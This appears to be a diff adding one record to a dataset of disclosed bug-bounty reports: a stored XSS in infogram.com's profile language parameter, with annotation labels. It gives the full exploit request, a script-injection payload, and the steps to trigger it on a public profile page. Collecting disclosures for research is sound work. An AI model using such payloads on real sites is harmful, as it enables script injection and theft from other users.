@@ -1,0 +1,42 @@
+{
+  "reported_to": "Infogram",
+  "reported_by": "theappsec ",
+  "title": "Stored XSS in infogram.com via language ",
+  "content": "\nThe stored XSS was found in the language profile parameter.\nPOC:\nChange profile settings with following request:\nCode 527 Bytes\n1PUT /api/users/me HTTP/1.1\n2Host: infogram.com\n3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0\n4Accept: */*\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Content-Type: application/x-www-form-urlencoded; charset=UTF-8\n8csrf-token: **your token**\n9X-Requested-With: XMLHttpRequest\n10Content-Length: 135\n11DNT: 1\n12Connection: close\n13Cookie: **your cookies**\n14\n15first_name=name&last_name=name&username=&confirm_password=password&language=></script><img src=x onerror=alert(document.domain)>;//\nGo to your public profile link.\nexample: https://infogram.com/dd_ddt7\nImpact\nThis allows an attacker to inject custom Javascript codes that can be used to steal information from infogram's users.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Stored"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1561204440,
+  "report_url": "https://hackerone.com/reports/430029",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Send a PUT request to `/api/users/me` with a malicious payload in the `language` parameter (e.g., `></script><img src=x onerror=alert(document.domain)>;//`)."
+    ],
+    [
+      2,
+      "Visit the public profile page (e.g., `https://infogram.com/dd_ddt7`) to trigger the XSS payload."
+    ]
+  ],
+  "vuln_description": "A stored XSS vulnerability exists in infogram.com via the language profile parameter. An attacker can inject malicious JavaScript code that executes when a victim views the attacker's public profile.",
+  "reason": "The vulnerability involves a straightforward injection into a user-controllable parameter (`language`), and the payload execution is triggered by visiting a predictable public profile URL. No complex interactions or state manipulations are required.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The stored XSS vulnerability involves injecting malicious JavaScript via the language parameter in a user profile update request. The methodology described focuses on authentication and authorization (AuthN/AuthZ) bypasses and IDOR vulnerabilities by swapping user sessions and resource IDs. Since this is a stored XSS vulnerability, it does not directly involve AuthN/AuthZ bypass or IDOR. Therefore, the described methodology would not detect this vulnerability.",
+    "is_detectable": false
+  }
+}
